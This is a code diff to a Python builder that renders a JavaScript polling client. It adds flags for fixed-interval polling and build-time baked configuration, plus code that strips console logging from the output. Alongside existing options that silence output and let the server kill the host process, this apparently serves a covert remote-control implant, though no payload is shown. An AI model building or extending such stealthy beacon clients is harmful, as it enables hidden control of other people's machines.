@@ -19,6 +19,10 @@ def add_arguments(parser):
                      help="Compile output-suppression into the client (console.* and process.stdout/stderr are redirected to a null sink at startup).")
     builder.add_argument("--exit-on-close", action="store_true",
                      help="Call process.exit(0) when the server sends a kill signal, terminating the host process.")
+    builder.add_argument("--no-adaptive-polling", action="store_true",
+                     help="Disable adaptive polling; use a fixed 100ms interval instead of exponential backoff with jitter.")
+    builder.add_argument("--no-arg-parsing", action="store_true",
+                     help="Remove runtime argument parsing; the client uses only the values baked in at build time.")
 
     cfg = parser.add_argument_group("Client configuration")
     cfg.add_argument("--server-url", default="localhost:8080",
@@ -38,6 +42,16 @@ def add_arguments(parser):
 
 
 def build(args):
+    if args.no_arg_parsing:
+        missing = []
+        if not args.encryption_key:
+            missing.append("--encryption-key / -e")
+        if args.server_url == "localhost:8080":
+            missing.append("--server-url")
+        if missing:
+            print(f"[!] --no-arg-parsing requires: {', '.join(missing)}")
+            sys.exit(1)
+
     template_dir = Path(__file__).resolve().parent / "templates"
     if not template_dir.is_dir():
         raise RuntimeError(f"Template directory not found: {template_dir}")
@@ -51,6 +65,24 @@ def build(args):
 
     template = env.get_template("client.js")
     rendered = template.render(**vars(args))
+
+    if args.no_print:
+        _console_prefixes = ('console.log(', 'console.error(', 'console.warn(', 'console.info(', 'console.debug(')
+        lines = rendered.splitlines()
+        result = []
+        skip_until_close = False
+        for l in lines:
+            if skip_until_close:
+                if ');' in l:
+                    skip_until_close = False
+                continue
+            if l.lstrip().startswith(_console_prefixes):
+                # Check if this is a multiline call (no closing paren on this line)
+                if l.count('(') > l.count(')'):
+                    skip_until_close = True
+                continue
+            result.append(l)
+        rendered = '\n'.join(result) + '\n'
 
     out_path = Path(args.name)
     out_path.parent.mkdir(parents=True, exist_ok=True)
